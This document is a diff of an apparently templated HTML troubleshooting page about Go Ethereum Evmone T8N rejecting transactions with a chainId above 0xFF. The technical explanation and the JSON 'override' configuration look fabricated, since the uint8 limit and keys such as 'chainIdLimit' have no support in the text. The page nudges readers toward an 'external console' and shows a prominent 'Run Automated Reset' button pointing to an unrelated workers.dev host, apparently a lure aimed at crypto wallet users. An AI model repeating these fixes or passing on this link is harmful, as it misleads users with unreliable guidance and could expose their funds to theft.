@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: system-ui;
-        background: #0a0c10;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #00adb5;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,39 +42,36 @@
 <h1>Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users observe that their transactions are being rejected by the Go Ethereum Evmone T8N when the <code>chainId</code> is greater than <code>0xFF</code>, resulting in failed transactions and potential loss of funds.</li>
+<li>Users encounter an error when attempting to process transactions with a <code>chainId</code> greater than <code>0xFF</code> using the Go Ethereum Evmone T8N implementation, resulting in rejected transactions.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The issue arises from the <code>chainId</code> being parsed as a <code>uint8</code>, which has a maximum value of <code>0xFF</code> (255). When a <code>chainId</code> greater than <code>0xFF</code> is used, it exceeds the maximum value that can be represented by a <code>uint8</code>, leading to the transaction being rejected.</li>
+<li>The issue arises due to the <code>chainId</code> being parsed as a <code>uint8</code>, which has a maximum value of <code>0xFF</code> (255). When a <code>chainId</code> exceeds this value, it cannot be properly represented, leading to transaction rejection.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve this issue, the following manual overrides can be applied:</li>
-<li>Update the <code>chainId</code> to a value within the valid range for <code>uint8</code> (0-255)</li>
-<li>Modify the Evmone T8N configuration to support <code>uint16</code> or <code>uint32</code> for <code>chainId</code></li>
-<li>Use a custom implementation to handle <code>chainId</code> values greater than <code>0xFF</code></li>
+<li>To resolve the issue, consider the following manual overrides:</li>
+<li>Update the Evmone configuration to support larger <code>chainId</code> values.</li>
+<li>Modify the transaction processing script to handle <code>chainId</code> values greater than <code>0xFF</code>.</li>
+<li>Utilize a custom <code>chainId</code> parser that can handle values beyond the <code>uint8</code> limit.</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;chainId&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="err">x</span><span class="mi">100</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;config&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;evmone&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;t8n&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nt">&quot;chainIdOverride&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
-<span class="w">      </span><span class="p">}</span>
+<span class="w">  </span><span class="nt">&quot;evmone&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;t8n&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;chainIdLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;uint16&quot;</span>
 <span class="w">    </span><span class="p">}</span>
 <span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console to execute these commands for a more seamless experience.</p>
+<p>For complex configurations, consider using an external console for more flexibility. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Go Ethereum Evmone T8N installed and configured</li>
-<li>A basic understanding of Ethereum transaction processing</li>
-<li>Familiarity with JSON configuration files and overrides</li>
+<li>Go Ethereum installation</li>
+<li>Evmone T8N configuration file access</li>
+<li>Basic understanding of Ethereum transaction processing</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-account-discovery-and-syncs-error-for-so.html">Metamask Extension Bug Account Discovery And Syncs Error For Social Login Import Users</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
